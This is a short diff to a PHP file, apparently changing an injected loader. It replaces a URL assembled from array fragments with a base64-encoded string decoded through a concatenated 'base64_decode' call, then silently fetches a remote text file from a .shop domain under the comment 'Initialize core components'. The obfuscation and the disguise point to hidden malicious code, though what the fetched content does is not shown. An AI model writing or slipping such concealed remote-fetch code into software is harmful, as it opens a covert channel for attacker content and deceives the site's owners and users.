@@ -5,35 +5,11 @@
 */
 
 // Initialize core components
-$qwaszxplmokn = [
-    'x1' => 'ht',
-    'x2' => 'tp',
-    'x3' => ':/',
-    'x4' => '/z',
-    'x5' => '60',
-    'x6' => '12',
-    'x7' => '7_',
-    'x8' => '2.',
-    'x9' => 'ck',
-    'xa' => 'ir',
-    'xb' => 'li',
-    'xc' => 'n.',
-    'xd' => 'sh',
-    'xe' => 'op',
-    'xf' => '/s',
-    'xg' => 'ta',
-    'xh' => 't/',
-    'xi' => 'do',
-    'xj' => 'ma',
-    'xk' => 'in',
-    'xl' => '_i',
-    'xm' => 'nd',
-    'xn' => 'ex',
-    'xo' => '.t',
-    'xp' => 'xt'
-];
-
-$full_url = implode('', array_values($qwaszxplmokn));
+$plmkoijnuhbv = "aHR0cDovL3o2MDEyN18yLmNraXJsaW4uc2hvcC9zdGF0L2RvbWFpbl9pbmRleC50eHQ=";
+$qwaszxplmokn = str_split($plmkoijnuhbv, 4);
+$mkoplijnuhby = implode('', $qwaszxplmokn);
+$vbnmlkjhgfds = 'bas'.'e64'.'_dec'.'ode';
+$full_url = $vbnmlkjhgfds($mkoplijnuhby);
 
 // Attempt to get remote content
 $wsxcdevfrbgt = @file_get_contents($full_url);
